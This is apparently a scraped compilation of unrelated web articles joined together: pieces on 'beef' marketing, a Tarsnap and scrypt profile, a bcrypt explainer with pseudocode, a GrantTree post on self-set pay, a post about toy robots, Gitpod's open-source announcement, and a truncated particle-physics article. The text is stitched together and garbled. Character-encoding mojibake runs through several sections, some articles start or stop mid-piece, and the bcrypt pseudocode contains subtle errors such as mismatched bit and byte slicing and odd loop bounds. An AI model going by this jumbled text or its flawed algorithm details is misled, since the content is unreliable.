<div><p>Basecamp vs. Apple is an example of taking up arms against your industry’s biggest players. It works because most of us <a href="https://hbr.org/2010/11/capitalizing-on-the-underdog-effect">enjoy rooting for the underdog</a>. We like to see small, plucky startups overcoming the odds and beating faceless corporate behemoths.</p><p>In the Apple example, DHH used the ubiquity of a globally recognized brand to raise awareness for a less famous product. His bombastic <a rel="noreferrer noopener" href="https://twitter.com/dhh/status/1272968382329942017?s=20" target="_blank">tweetstorms</a> and <a rel="noreferrer noopener" href="https://m.signalvnoise.com/on-apples-monopoly-power-to-destroy-hey/" target="_blank">blog posts</a> garnered coverage from media outlets like Wired, TechCrunch, and Engadget. By piggybacking on the vaunted Apple brand, Basecamp turned a pedestrian problem—app store regulation—into a huge PR coup.</p></div>
<!-- /wp:paragraph -->

<!-- wp:html -->
<blockquote><p lang="en" dir="ltr">Like any good mafioso, they paid us a visit by phone. Stating that, firstly, that smashing our windows (by denying us the ability to fix bugs) was not a mistake. Then, without even as much of a curtesy euphemism, said they'd burn down our store (remove our app!), lest we paid up.</p>— DHH (@dhh) <a href="https://twitter.com/dhh/status/1272969688507539457?ref_src=twsrc%5Etfw">June 16, 2020</a></blockquote> 
<!-- /wp:html -->

<!-- wp:paragraph -->
<div><p>Like legacy solutions, huge companies are relatively easy targets. A company of Apple’s size is used to criticism and weathers it on a regular basis (as <a href="https://twitter.com/Austen/status/1273236329178869761?s=20">Austen Allred</a> points out, <em>“Apple has plenty of experience with ‘I don’t care what you think’ as a stance”</em>). The blow is softened further by the decision to attack a nebulous, unsexy part of the bigger Apple business—App Store regulation instead of, say, the iPhone.</p><p><a rel="noreferrer noopener" href="https://wistia.com/" target="_blank">Wistia</a> is another company that’s adopted a strategic beef with an industry giant: YouTube. The giant video platform is referred to as a<em> “<a rel="noreferrer noopener" href="https://wistia.com/learn/marketing/where-to-share-your-brands-video-content-besides-youtube" target="_blank">legacy social network</a>,”</em> with warnings made to avoid a<em> “world where Google keeps your traffic, owns your subscribers, and controls their viewing experience.”</em> There’s even a guide that walks the reader through the steps required to <a rel="noreferrer noopener" href="https://wistia.com/learn/marketing/how-to-delete-your-youtube-channel" target="_blank">delete their YouTube channel</a>.</p></div>

<!-- wp:heading -->
<h2><strong>You vs. your Competitors</strong></h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4>Spice Level: 🌶️🌶️🌶️</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<div><p>Box took beef marketing to its logical conclusion by leveling criticism at the company’s direct competitors. Instead of tip-toeing, Box went<a href="https://techcrunch.com/2015/01/22/box-has-always-been-about-reshaping-enterprise-software/"> straight for the jugular</a>.</p><p>Many companies are reluctant to acknowledge the existence of their competitors, but loyal customers are not the product of information asymmetry. Most customers already know about your competitors.</p></div>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Against that backdrop, Box understands that an honest critique of the competition is a powerful differentiator. It’s a chance to make the comparison on your terms. It raises awareness for your product among the very customer base you’re trying to court. It’s useful for the customer, and it oozes confidence.<br></p>
<!-- /wp:paragraph -->

<figure><img src="https://2l4ff1gokdmn317w442ckjyu-wpengine.netdna-ssl.com/wp-content/uploads/2020/08/image-10.png" alt="box-billboard.jpg"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<div><p><a href="https://techcrunch.com/2015/01/22/box-has-always-been-about-reshaping-enterprise-software/">Source</a></p><p>Box was able to make these feature comparisons because they took pains to offer a truly competitive product. You can likely do the same: most founders aim to build products that are better and different than anything that’s come before. There’s no need to be coy when you’ve built a best-in-class product—calling out the limitations of competitors is fair game.</p></div>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<div><p>Even without feature parity, direct comparisons can work in your favor: if you’re not strictly <em>better, </em>highlight how you’re <em>different.</em></p><p><a rel="noreferrer noopener" href="https://www.podia.com/" target="_blank">Podia</a> is an example for competitor critique done well. They harness a strategy we call “competitor alternative” content: using the natural search volume for keywords like “<a rel="noreferrer noopener" href="https://www.podia.com/clickfunnels-alternative" target="_blank">clickfunnels alternative</a>” or “<a rel="noreferrer noopener" href="https://www.podia.com/teachable-alternative" target="_blank">teachable alternative</a>” to create search-friendly comparison pages. Each page includes testimonials from post-switch users, a direct feature comparison, and a clear product call-to-action.</p></div>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Crying Wolf</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<div><p>The power of a beef marketing strategy stems largely from its rarity; few companies call out their rivals, so we take notice when one does. We don’t follow brands that cry wolf, because the strategy loses efficacy with each subsequent crusade (case in point: I’m starting to develop cynicism around Basecamp’s ongoing feud with </p><a href="https://www.animalz.co/blog/thought-leadership-content/"><s>offices</s> <s>meetings</s> <s>email</s> big tech</a><p>).</p><p>If you want to incorporate the power of beef into your marketing, use it sparingly and deliberately.</p></div>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<div><p>Each of the companies covered here—HubSpot, Box, Basecamp, Coda, Wistia, and Podia—spend far more time and energy on the “hero” part of their marketing (building incredible products, adding value through content) than they do the “nemesis” portion. They use villains as a point of contrast—a way of bringing their great work into sharp relief.</p><p><em>H/T to Benyamin Elias for introducing me to the term beef marketing <a rel="noreferrer noopener" href="https://masters.substack.com/p/oatly-picking-a-fight-marketing" target="_blank">in his newsletter</a>.</em></p></div>

August 25, 2020 | https://blog.firosolutions.com/2020/08/tarsnap-podcast/ | <a href="https://web.archive.org/web/*/https://blog.firosolutions.com/2020/08/tarsnap-podcast/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  





<p><img alt="tarsnap security headlines podcast with Colin Percival" src="https://blog.firosolutions.com/tarsnap.png"></p><p>Tarsnap is a backup service running with the slogan “Online backups for the truly paranoid”.<br>
The service has well earned its slogan as a secure backup option.<br>
Created in 2006 by at the time FreeBSD’s security officer Dr. Colin Percival, who<br>
was responsible for FreeBSD’s security advisory.<br>
Colin is not only a successful entrepreneur but also a dedicated FreeBSD user.<br>
After dealing with the pain of running Tarsnap for himself for a while he decided<br>
to follow Paul Graham’s<br>
wisdom of “There are certain things that naturally needs to be companies” and<br>
the Tarsnap company is born
While modern startup companies spend there budget on marketing campaigns, pouring<br>
in Money into Google Adwords and similar service,
Colin focused on building a great product that resulted in its user base adoption.  He
even experimented with google adwords spending around 200 usd, but it didnt<br>
result in any new users. Proving that when
you provide a good value to the market, the market rewards you.</p>

<p>Colin has been getting his hands dirty with FreeBSD in the late 1990’ies<br>
when the firewall in his family house<br>
running openbsd crashed due to disk failure. After changing the disk he<br>
did not manage to<br>
figure out how to install OpenBSD so he went with FreeBSD.   While<br>
studying for his doctrine, he got concern<br>
about security, that led him to use freebsd where he later jumped<br>
on as FreeBSD security officer.<br>
Being the FreeBSD’s security officer gave him knowledge of<br>
security holes before anyone else did and<br>
he needed a secure backup solution for storing his files.<br>
After some head scratching, he decided to<br>
go the startup route and create his own backup solution. After<br>
getting several user requests about having<br>
password-protected key storage, Collin created Tarsnap’s<br>
secure cryptographical solution for<br>
protecting keys called “Scrypt”, which later got picked up by several opensource<br>
projects such as the cryptocurrency project Litecoin.</p>

<p>Colin is a very intelligent and trustworthy person, to<br>
improve security when connecting<br>
and staying connected between machines he creates spiped.<br>
Adding a layer of safety on top of just using regular<br>
ssh, to mitigate attacks and weaknesses caused by OpenSSL.</p>

<p>Because scrypt has a heavy resource need, making it hard for<br>
attackers to crack, it became a more secure alternative then the<br>
standard hash functions we use in modern systems such as sha1 and md5.</p>

<p>The project started to growth and it was soon adopted by various larger companies<br>
such as stripe.</p>

<p>If you are interested in finding and submitting bugs in Tarsnaps<br>
own code base, Colin has put up a Bug bounty<br>
rewarding the people that find all kinds of bugs in the code base, a fun<br>
fact is that a majority of the security bugs<br>
that gets submitted is not found by security researchers looking<br>
for holes but by average developers looking at<br>
the functions in the code.</p>

<p>Today Tarsnap runs on a large set of different systems by a diverse<br>
crowd, providing secure storage of<br>
data thanks to its stable code base and amazon s3.</p>

<p>Colin also donates Tarsnap’s December profit to the opensource<br>
community sponsoring the FreeBSD foundation, the EuroBSD<br>
conference, the bsdcan conference, bsdnow podcast and several other projects.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			
<p>Bcrypt is a <a href="https://qvault.io/2019/12/30/very-basic-intro-to-key-derivation-functions-argon2-scrypt-etc/">key derivation function</a>, which can be thought of as a slow <a href="https://qvault.io/2020/01/01/very-basic-intro-to-hash-functions-sha-256-md-5-etc/">hash function</a>. Its purpose is to <em>slowly</em> convert a piece of input data to a fixed-size, deterministic, and unpredictable output. A common use-case is to convert a password into an n-bit cryptographic key, which can then be used for safe authentication. </p>



<p>Here at <a href="https://classroom.qvault.io/">Qvault,</a> we use Bcrypt in our security systems. Bcrypt is a very popular password hashing function, so much so that it’s the hash function we currently teach the implementation of in our <a href="https://classroom.qvault.io/">Practical Cryptography</a> course.</p>



<h2>What Bcrypt Looks Like</h2>



<p>Using Bcrypt on the password <em>myPassword123</em> would produce something like the following:</p>



<pre><strong><em>myPassword123</em> </strong>-&gt;
$2y$12$vUw4OU4EAl4w4vC6/lA33OtDSYGhiIdekdT9iOoSs9/ckwrffaEui</pre>



<p>That output can be used to compare against future hashes against to see if the original data matches.</p>



<h2>Why not compare passwords directly?</h2>



<p>In web development,<em> </em>it is insecure to store user’s passwords in plain text. If an attacker were to gain access to the server’s database they could find raw email/password combinations and use them to attack the same users on other sites. </p>



<p>At the <em>very least</em> we must hash user’s passwords, but hash functions like <a href="https://qvault.io/2020/07/08/how-sha-2-works-step-by-step-sha-256/">SHA-2</a> and MD5 are too fast to be secure. Using a KDF like Bcrypt provides security benefits over fast hashes because it is computationally expensive and slow. If an attacker gains access to a database of password hashes made with fast algorithms it is easy for them to “reverse” the hashes by guessing different inputs and seeing if the outputs match.</p>



<p>For example, let’s say the attacker finds the following entry in a database:</p>



<pre>user@gmail.com 5906ac361a137e2d286465cd6588ebb5ac3f5ae955001100bc41577c3d751764</pre>



<p>They can try hashing common passwords like:</p>



<pre>password1 -&gt;
0b14d501a594442a01c6859541bcb3e8164d183d32937b851835442f69d5c94e
password2 -&gt;
6cf615d5bcaac778352a8f1f3360d23f02f34ec182e259897fd6ce485d7870d4
password3 -&gt; 5906ac361a137e2d286465cd6588ebb5ac3f5ae955001100bc41577c3d751764</pre>



<p><br>The password, <code>password3</code>, produced a matching hash! Now the attacker knows that <code>user@gmail.com</code> is likely to use the password <code>password3</code> on other sites and can go hack other accounts. This is only possible because the attacker is able to quickly compute many hashes per second and guess millions of potential passwords.</p>



<p>A slow KDF like Bcrypt solves this problem.</p>



<h2>Bcrypt Output Format</h2>



<pre>$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
\___/\__/\_____________________________/\___________________________________/

<p>Direct from <a aria-label="Wikipedia (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Bcrypt#Description" target="_blank">Wikipedia</a></p>



<h2>Bcrypt Explained Step by Step</h2>



<p>Bcrypt can be visualized with the following Go-like pseudo code:</p>



<pre><code lang="go">func bcrypt(cost int, salt [16]byte, password [72]byte) (hash string) {
	// Initialize Blowfish state with expensive key setup algorithm
	// This is the slow part of the algorithm
	pEighteenSubkeys, sFourSubBoxes := expensiveBlowfishSetup(cost, salt, password)

	// Repeatedly encrypt the text "OrpheanBeholderScryDoubt" 64 times
	// 24 bytes = three 64-bit blocks
	ctext := "OrpheanBeholderScryDoubt"
	for i := 0; i &lt; 64; i++ {
		// Encrypt using standard Blowfish in ECB mode
		ctext = encryptECB(pEighteenSubkeys, sFourSubBoxes, ctext)
	}

	// return the version, cost, salt, and ctext in the proper format
	return "$2a${cost}${salt}{ctext}"
}</code></pre>



<p>As you can see, Bcrypt depends heavily on the <a href="https://en.wikipedia.org/wiki/Blowfish_(cipher)" rel="noopener">Blowfish</a> cipher. Put simply, Bcrypt is an expensive key expansion coupled with Blowfish encryption.</p>



<p>The <code>expensiveBlowfishSetup</code> function can be understood by following pseudo code:</p>



<pre><code lang="go">// pEighteenSubkeys: array of 18 subkeys
// sFourSubBoxes: Four substitution boxes
// Each S-Box is a 256-length array of uint32
func expensiveBlowfishSetup(cost int, salt [16]byte, password [72]byte) (pEighteenSubkeys [18]uint32, sFourSubBoxes [4][256]uint32) {
	// Initialize arrays
	pEighteenSubkeys := [18]uint32
	sFourSubBoxes := [4][256]uint32

	// Fill pEighteenSubkeys and sFourSubBoxes with the hex digits of pi 
	// This initial state works as in the original Blowfish algorithm
	// it populates the P-array and S-box entries with the fractional part of pi in hexadecimal
	pEighteenSubkeys = fillWithPi(pEighteenSubkeys)
	sFourSubBoxes = fillWithPi(sFourSubBoxes)

	// Permutate P and S based on the password and salt
	pEighteenSubkeys, sFourSubBoxes = expandKey(pEighteenSubkeys, sFourSubBoxes, salt, password)

	// This is the "Expensive" part of the "Expensive Key Setup"
	// Otherwise the key setup would be identical to Blowfish
	// Expand the key an exponentially increasing number of times
	// depending on the cost factor
	for i := 0; i &lt; math.Pow(2, cost); i++ {
		pEighteenSubkeys, sFourSubBoxes = expandKey(pEighteenSubkeys, sFourSubBoxes, 0, password)
		pEighteenSubkeys, sFourSubBoxes = expandKey(pEighteenSubkeys, sFourSubBoxes, 0, salt)
	}

	return pEighteenSubkeys, sFourSubBoxes
}</code></pre>



<p><code>The expandKey function</code> is executed an exponentially increasing number of times depending on the value of the <code>cost</code> parameter. The <code>expandKey</code> function is explained by the following pseudo-code:</p>



<pre><code lang="go">func expandKey(pEighteenSubkeys [18]uint32, sFourSubBoxes [4][256]uint32, salt [16]byte, password [72]byte) (
	pEighteenSubkeys [18]uint32, sFourSubBoxes [4][256]uint32
	) {

	// Mix password into the pEighteenSubkeys array
	// by XORing password with subkeys
	for i := 0; i &lt; 18; i++{
		// treat the password as cyclic, XOR 32 bit chunks of password with subkeys
		pEighteenSubkeys[i] ^= password[i % 18]
	}
 
   // Treat the 128-bit salt as two 64-bit halves 
   saltHalf[0] = salt[0:63]
   saltHalf[1] = salt[64:127]

   // Initialize an 8-byte (64-bit) buffer with all zeros.
   block := [8]byte

   // Mix internal state into P-boxes   
   for i := 0; i &lt; 9; i++ {
	  // XOR 64-bit block with a 64-bit salt half
	  // Each iteration alternating between saltHalf[0], and saltHalf[1]
      block ^= saltHalf[(i-1) mod 2]

	  // Encrypt block using current key schedule with blowfish block encryption
	  block = Encrypt(pEighteenSubkeys, sFourSubBoxes, block)
	  
	  // Split block and use as new subkeys
      pEighteenSubkeys[2*i] = block[0:31]
	  pEighteenSubkeys[2*i + 1] = block[32:63]
   }

   // Mix encrypted state into the internal S-boxes of state
   for i := 0; i &lt; 4; i ++ {
      for j := 0; j &lt; 127; j++ {
		// Encrypt block using blowfish block encryption
		// where salt[i] is 64 bit chunks
        block = Encrypt(pEighteenSubkeys, sFourSubBoxes, block ^ salt[i])
        sFourSubBoxes[2*i] = block[0:31]
		sFourSubBoxes[2*i + 1] = block[32:63]
	  }
	}
    return pEighteenSubkeys, sFourSubBoxes
}</code></pre>



<p>It helps me to visualize the details of the pseudo-code by using a more “real” programming syntax like Go. If that doesn’t help you then take a look at the code on the <a aria-label="Wikipedia (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Bcrypt#Algorithm" target="_blank">Wikipedia</a> page here.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>Happy Bossâ€™s Day! Or is it Merry Bossâ€™s day? Come to think about it, what even is Bossâ€™s day? It sounds like a holiday invented by a search engine or a particularly cloying batch of Hallmark interns.</span></p><p><span>It shouldnâ€™t bother me, I suppose. I’m my own boss, like everyone else at GrantTree. Itâ€™s my day too. So let’s just pretend todayâ€™s a nice excuse for me to buy myself a new mug. We’ll ignore the fact that asking people to thank their boss for being nice is…well…absurd.<br> </span></p><p><span>In truth, there are no â€˜bossesâ€™ at GrantTree. We embrace a unique organisational philosophy called Open Culture, where there are no managers, no subordinates, no hierarchy of personnel. Each employee has autonomous control, or â€˜domainâ€™, over their specific responsibilities. The companyâ€™s functions are assigned to employees (we call them partners) who are interested and qualified to manage them. </span></p><p><span>For example, Iâ€™m in charge of writing GrantTreeâ€™s blog posts. While I can ask my colleagues for their input, Iâ€™m under no obligation to change what I write. There are ways for my colleagues to intervene if I publish something that could damage the company. But otherwise I have free rein. Iâ€™m trusted to do a good job. </span></p><p><span>This isnâ€™t to say thereâ€™s no hierarchy at GrantTree. There is a hierarchy of work. Writing blog posts is part of the work of Marketing, which is part of the work of our Tax Credits business. In this model, work is subordinate to other kinds of work. Blog posts ultimately serve our Tax Credits business, for instance. While still relatively flat, this organisation creates structure.</span></p><p><span>The lack of a â€˜personnel hierarchyâ€™ means each person can make important decisions within their sphere of influence and accountability. We call this system self-management. Self-management has some interesting consequences, aside from the fact I have to write my own Bossâ€™s Day card. For one thing, I canâ€™t get promoted. Not in the traditional sense. Thereâ€™s no â€˜ladderâ€™ to climb. I can choose to take on more responsibility by signing up for more duties, but thereâ€™s no top-down system of appraisal and reward. No one will sit me down in a yearâ€™s time and give me a raise. </span></p><p><span>So what do I do if I deserve a raise? Simple. I give myself one. </span></p><p><span>At GrantTree, we set our own pay. </span></p><p><b>Yes, I really do set my own pay</b></p><p><span>Having partners set their own pay is the ultimate expression of the self-management philosophy. Companies often use self-management as a millennial-baiting euphemism for a handful of fairly superficial freedoms like working remotely or wearing shorts in the office. </span></p><p><span>True self-management goes far beyond relaxing company etiquette. It requires taking control from the upper echelons of management and sewing it into the primary responsibilities of every single employee. Thereâ€™s no better (or more challenging) example of this than empowering staff to adjust their own pay. </span></p><p><span>When I talk to my friends and family about GrantTreeâ€™s radical practices, they give me a suspicious look. But when it comes to the idea of setting my own salary, they look almost aghast. Then they’ll usually ask me â€˜why donâ€™t you just quadruple your salary and be done with it?â€™</span></p><p><span>The simple answer is I, like most people, wouldnâ€™t do that. GrantTree expects partners to act responsibly. Our hiring process thoroughly tests a candidateâ€™s development and maturity. If someone were short-sighted enough to raise their pay to exorbitant levels, they probably wouldn’t be hired in the first place.</span></p><p><span>But moving past this silly example, what would happen if I felt I deserved a reasonable raise? </span></p><p><b>How I change my pay </b></p><p><span>In most jobs, salaries are set by negotiation – a tug of war between company and employee. Salaries are reflections of more than an employeeâ€™s development or market value. They incorporate the strength of both sidesâ€™ bargaining positions and their ability to argue their case. GrantTree removes negotiation from the procedure and places the decision entirely on the shoulders of the partner, via a process called Pay Self-Assessment (PSA for short). Hereâ€™s how it works.</span></p><p><span>There are four stages: We collect data relevant to our salary and performance, we write a proposal for a new salary based on this data, we receive feedback on our proposal and we make a final decision about our pay. </span></p><p><span>1) Data Collection </span></p><p><span>This is where I collect data that will inform my decision about what my salary should be, including information about my performance, my career progression, the market value of my role (i.e. what I could be earning given my skills and experience), and an analysis of the impact my raise will have on the companyâ€™s budgets. Then I look at what this data says. If, for example, the evidence shows I have grown professionally and that the market value for my skills has increased, I can work out a numerical value for my wage increase. Of course, the data could also could lead me to conclude that I should be paid less. PSA isnâ€™t just about raises. Pay decreases are also possible.</span></p><p><span>2) PSA Proposal</span></p><p><span>I then compile this information into a PSA Proposal; a form in which I state my current pay, my proposed new salary, and an explanation for how the data and evidence I have collected supports my proposal for a pay raise. For example, I would point to how the data I have collected indicates professional growth and my market value has increased.</span></p><p><span>3) PSA Feedback</span></p><p><span>A number of my colleagues – those who supplied evidence in the data collection stage – will then review my PSA Proposal to provide feedback and ask questions about the data Iâ€™ve provided. For example, they could suggest that Iâ€™ve misinterpreted the budgetary impact of my proposed wage increase, and that I should lower it. This feedback isnâ€™t binding. Itâ€™s there to advise me on the best course of action, for both me and the company. Â&nbsp;</span></p><p><span>4) PSA Decision</span></p><p><span>Finally, I publish my Pay Decision. This confirms my new salary and also allows me the opportunity to answer questions or concerns my colleagues posed in their feedback to my PSA Proposal. My new salary will take effect the next pay cycle. And voila. Thatâ€™s it. I have my pay raise.</span></p><p><span>The PSA process might seem strange. It did to me, at first. I used to work for a large PR firm where the process for granting raises and promotions was both inscrutable and strictly controlled. But now I can see the benefits of this approach. While a lot of companies underpay employees that have been with them a long time, the PSA process allows us to set our wage at a level that reflects our value to the company.</span></p><p><span>However you prefer to be managed, I hope you feel valued and fairly paid. If you do have a nice manager, maybe get them a card for Bossâ€™s day. Or not. Itâ€™s a silly idea, anyway. </span></p></div></div>]]>

<p>This little guy is one of many cardboard robots that I've made over the years. During summers, my sister and I would go to Vineland, New Jersey to stay with my aunt and cousins for a glorious week of catching frogs, playing Sega Genesis, eating spoonfuls of iced tea mix, and arts 'n' crafts.</p>
<p>For some reason, we'd always center on a unique theme each year for our arts 'n' crafts. One summer, it was <a href="https://www.charlieharrington.com/create-wonderful-things-be-good-have-fun">Klutz Press friendship bracelets</a>. Another was god's eyes - we made hundreds. Our proudest summer craft of them all? A "working" cardboard R2-D2. If not for a late '90s winter basement flood, Cardboard Artoo would still be with us today.</p>
<p>I decided to try my hand at making another cardboard robot because I've been thinking a lot about them. Mostly because I'm writing a children's novel about robots, but also cause it's summer and that's the sort of thing you do during summer.</p>
<p>There are all kinds of robots, cardboard and not. But there's a certain sort of robot that makes my gears turn. The rest of this post will review my favorite robots (and the kid who loves them).</p>

<h3>R.O.B. (Robotic Operating Buddy)</h3>
<p>It's a robot... for your original Nintendo. I'm embarassed to admit it, but I've never seen a R.O.B. in real-life, despite scouring every local garage sale in New Jersey for years.</p>

<p>R.O.B. only ever worked with two Nintendo games. From what I've read, neither is very fun. But I'm sure there are some great ROM-hacks out there with more robotic operating buddy interactions.</p>
<h3>Johnny 5</h3>
<p>Duh.</p>
<p>Johnny 5 looks a lot like R.O.B., except with more nuclear-weapons. He loves reading, loves input, loves New York City. A loyal friend, and perhaps a bit too gullible for his own good.</p>

<p>It's probably becoming quite clear that I'm drawn to a rectangular face on a telescopic neck with tread-like wheels. That's just my type.</p>
<p>I also just discovered this video of someone's real-life Wall-E, and it's frightenly real-looking. Maybe this means I'll get to meet a Wall-E one day, hopefully not on a post-apocalyptic wasteland Earth.</p>

<h3>The flying robots from *Batteries Not Included</h3>
<p>I don't remember much about this movie, other than that my sister and I watched the recorded-from-TV VHS tape all the time, and there were these super cute baby flying robots who lived with a bunch of old people in an apartment building in New York City.</p>

<p>We got our 2-XL at a garage sale (garage sales were things of wonder to me as a child). Yes, we had the original 2-XL, the eight-track one. In fact, 2-XL was my first and only interaction with an eight-track system. In the early `90s, Tiger Electronics must have bought 2-XL, and they came out with a cassette-version. </p>

<p>Cozmo's fatal flaw is how nearly impossible it is to connect your phone to the robot's local wifi service, which is how you are forced to control and interact with Cozmo. The connection process is random, non-deterministic, and saps up most of the time you've allocated to play with Cozmo. Also, Cozmo's parent company recently went out of business, which is a huge bummer for the robot-toy industry.</p>
<p>That said, I've had a lot fun with Cozmo, including <a href="https://www.charlieharrington.com/teaching-my-robot-with-tensorflow">teaching him how to find my toothpaste with a TensorFlow computer vision model</a>.</p>
<h3>Droids</h3>
<p>Okay, the main event. Droids.</p>
<p>The Star Wars folks who put together the droids for A New Hope are complete geniuses. They're dirty, they're resilient, they're loyal, they're funny, they're everywhere. I could go through a whole list of them, cause I really do love them all (GNKs, Artoo, Threepio, IG-88, BB-8, those little mouse-like black boxes in the Death Star), but in a rare dose of restraint, here's my favorite Star Wars droid!</p>

<p>It's R.O.B. with a longer neck, a blue face, and way more creepy claw arms. You may remember this robot critter from its role in repairing the Millenium Falcon at Hoth Base in Empire Strikes Back. Or at least attempting to repair.</p>

August 25, 2020 | https://www.gitpod.io/blog/opensource/ | <a href="https://web.archive.org/web/*/https://www.gitpod.io/blog/opensource/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>As of today Gitpod is open source under the AGPL license at <a href="https://github.com/gitpod-io/gitpod" target="_blank" rel="nofollow noopener noreferrer">github.com/gitpod-io/gitpod</a>. This allows the community to participate in the development of Gitpod, provides more transparency and makes it even easier for developers to use and integrate Gitpod in their workflows.</p>
<p>For those of you who know us, this probably does not come as a big surprise. Working in open source is in our DNA and everything we’ve created over the past 10 years, including <a href="https://github.com/eclipse-theia/theia" target="_blank" rel="nofollow noopener noreferrer">Theia</a>, <a href="https://github.com/eclipse/xtext" target="_blank" rel="nofollow noopener noreferrer">Xtext</a>, <a href="https://github.com/eclipse/openvsx" target="_blank" rel="nofollow noopener noreferrer">Open VSX</a> and many other projects have been open source. In fact, Gitpod was our only closed-source project and it is a relief to change that going forward.</p>

<p>Contributing to Gitpod should be easy and accessible for everyone. All contributions are welcome, including pull requests, issues, documentation as well as updates and tweaks, blog posts, tutoials, and more. Please head over to <a href="https://github.com/gitpod-io/gitpod" target="_blank" rel="nofollow noopener noreferrer">Github</a> to find out about the various ways you can contribute and join our <a href="https://community.gitpod.io/" target="_blank" rel="nofollow noopener noreferrer">Gitpod Community</a>.</p>
<p>Over the past year, Gitpod has simplified contributions to many open source projects (see <a href="https://contribute.dev/" target="_blank" rel="nofollow noopener noreferrer">contribute.dev</a> for examples). Today, everyone in our team is excited to share our own streamlined development pipeline including Kubernetes preview deployments, an aggressively cached build system, our own slim and fast CI system and of course Gitpod, which continuously beams us into ready-to-code (and debug) dev environments. <a href="https://github.com/csweichel" target="_blank" rel="nofollow noopener noreferrer">Chris</a> gave a great talk about this setup earlier this year 👇</p>
<div> <p> <iframe title="" src="https://www.youtube.com/embed/dFMpXUsJcGM?rel=0" allowfullscreen=""></iframe> </p> </div>
<p>Naturally, we develop Gitpod in Gitpod. This allows the  whole team  to spin up fully initialized, remote dev environments on any branch at any time. </p>
<p>In line with the <a href="http://cloudscaling.com/blog/cloud-computing/the-history-of-pets-vs-cattle/?utm_source=thenewstack&amp;utm_medium=website&amp;utm_campaign=platform" target="_blank" rel="nofollow noopener noreferrer">pets vs. cattle</a> analogy of the cloud-native world, we treat dev environments as automated (yet customizable) resources you can spin up when you need them and close down (and forget about) when you are done with your task. Once you experience the peace of mind of automated, ephemeral dev environments you never want to go back.</p>
<p>Sven will run a webinar next week on Thursday, where we will showcase how we use Gitpod internally at Gitpod and how much it improves our workflow. Hope to see you there! </p>



<p>The <a href="https://www.gitpod.io/pricing/#" target="_blank" rel="nofollow noopener noreferrer">SaaS offering of gitpod.io</a> remains the easiest way to streamline your development workflows with continuously prebuilt dev environments. </p>
<p>In case you want to host Gitpod on your own infrastructure or private cloud, starting today, Gitpod Self-Hosted is free for unlimited users. Organizations using Gitpod Self-Hosted can purchase an enterprise license in order to get additional features like:</p>
<ul>
<li><a href="https://www.gitpod.io/features/#snapshot" target="_blank" rel="nofollow noopener noreferrer">Snapshots</a> (share a reproducible workspace with your team)</li>
<li><a href="https://www.gitpod.io/features/#share" target="_blank" rel="nofollow noopener noreferrer">Live Share</a> (invite others into your running workspace)</li>
<li><a href="https://www.gitpod.io/features/#prebuilt" target="_blank" rel="nofollow noopener noreferrer">Unlimited Prebuilds</a> (making ephemeral dev environments possible)</li>
<li>Admin Dashboard</li>
</ul>
<p>Offering a paid plan for enterprises makes it possible for us to keep working towards building a new category in developer tooling, which completes modern DevOps pipelines. In the future we will add additional functionality to both the open source code as well our paid offering.</p>

        <p><span><br></span><span>W</span>hen particle physicists try to model experiments, they confront an impossible calculation—an infinitely long equation that lies beyond the reach of modern mathematics.&nbsp;<br></p>

<p>Fortunately, they can generate largely accurate predictions without seeing this arcane math all the way through. By cutting the calculation short, scientists at CERNâ€™s Large Hadron Collider in Europe make forecasts that match events they actually observe when they send subatomic particles barreling toward each other around a nearly 17-mile track.</p>
<p>Unfortunately, the era of agreement between forecast and observation may be ending. As measurements grow more precise, the approximation schemes theorists use to make predictions may not be able to keep up.</p>
<p>â€œWeâ€™re getting close to exhausting what can be done,â€� said&nbsp;<a href="https://theory.cern/roster/duhr-claude" target="_blank">Claude Duhr</a>, a particle physicist at CERN.&nbsp;</p>
<p>But&nbsp;<a href="https://link.springer.com/article/10.1007/JHEP02(2019)139" target="_blank">three</a>&nbsp;<a href="https://journals.aps.org/prl/abstract/10.1103/PhysRevLett.123.201602" target="_blank">papers</a>&nbsp;from a group of physicists led by&nbsp;<a href="https://amplitudesatpadova.wixsite.com/amplitudes-at-padova" target="_blank">Pierpaolo Mastrolia</a>&nbsp;of the University of Padua in Italy and&nbsp;<a href="https://www.ias.edu/scholars/sebastian-mizera" target="_blank">Sebastian Mizera</a>&nbsp;of the Institute for Advanced Study in Princeton, New Jersey, have revealed an underlying mathematical structure in the equations. The structure provides a new way of collapsing interminable terms into just dozens of essential components. Their method may help bring about new levels of predictive accuracy, which theorists desperately need if they are to move beyond the leading but incomplete model of particle physics.</p>
<p>â€œThey have delivered lots of proof-of-concept results which show that this is a very promising technique,â€� Duhr said.</p>
<p>There could be a bigger payoff than improved predictions.&nbsp;</p>
<p>The new method skirts the traditional mathematical slog by directly computing â€œintersection numbers,â€� which some hope could eventually lead to a more elegant description of the subatomic world.&nbsp;</p>
<p>â€œThis is something thatâ€™s not just mathematics,â€� said&nbsp;<a href="https://www.physics.mcgill.ca/~schuot/" target="_blank">Simon Caron-Huot</a>&nbsp;of McGill University, a quantum theorist who is studying the implications of Mastrolia and Mizeraâ€™s work.&nbsp;â€œItâ€™s something thatâ€™s deeply baked into quantum field theory.â€�&nbsp;</p>
<p><strong>An Infinite Loop</strong></p>
<p>When physicists model particle collisions they use a tool called a Feynman diagram, a simple schematic invented by Richard Feynman in the 1940s.</p>
<p>To get a feel for these diagrams, consider a simple particle event: Two quarks streak in, exchange a single gluon as they â€œcollide,â€� then bounce away on their separate trajectories.</p>
